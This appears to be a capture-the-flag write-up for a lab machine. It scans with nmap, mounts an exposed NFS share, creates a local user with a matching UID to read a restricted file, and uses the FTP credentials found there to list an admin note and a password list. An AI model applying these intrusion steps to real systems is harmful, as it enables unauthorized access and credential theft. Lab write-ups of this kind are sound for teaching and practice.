Enumeration
## Enumeration

First, nmap as follows:

```sh
nmap --min-rate 4000 -p- 10.10.16.106
```

---

### Enumerating NFS
Since there is an NFS I want to take a look at it.

```sh
showmount -e 10.10.16.106
Export list for 10.10.16.106:
/mnt/share *
```

So, there is a share I can mount in the following way

```sh
mkdir /tmp/nfsfiles
sudo mount -t nfs 10.10.16.106: /tmp/nfsfiles

OR

mkdir /tmp/nfsfiles1
sudo mount -t nfs 10.10.91.123:/mnt/share /tmp/nfsfiles1

sudo su hijack 
cd /tmp/nfsfile
```

A look at the file permissions tells me, that a user with `uid 1003` created the
share. Therefore, a user with the same uid on the local attack machine, where
the share has been mounted, is needed to get permissions to open the directory.

```sh
ls -la
ls -l nfsfiles/mnt/

drwx------ 2 1003 1003 4096 Aug  8 21:28 share
```

```sh
sudo useradd hijack -u 1003  -m -s /bin/bash

```

Now switch to the user and take a look at the inside of the share.

```sh
cd nfsfiles1/

OR

ls -la nfsfiles/mnt/share/
total 12
drwx------ 2 hijack hijack 4096 Aug  8 21:28 .
drwxr-xr-x 3 root   root   4096 Aug  8 21:28 ..
-rwx------ 1 hijack hijack   46 Aug  8 21:28 for_employees.txt
```

Taking a look at the file provides the following

```sh
cat for_employees.txt

OR

cat nfsfiles/mnt/share/for_employees.txt

# ftp creds :

# ftpuser:XXXXXXXXXXXXXXXXXXXXXXXX
```

### Delete a User
```
sudo userdel hijack
```

---

Next up, using the credentials on the ftp server

```sh
ftp ftpuser@10.10.16.106
Connected to 10.10.16.106.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||38678|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 .
drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08 19:28 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08 19:28 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08 19:28 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08 19:28 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08 19:28 .profile
226 Directory send OK.
```

Two files are `.from_admin.txt` and
`.password_list.txt` are of special interest . The former file contains the following

```
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```

The latter is a list of random passwords the admin seems to have created earlier.
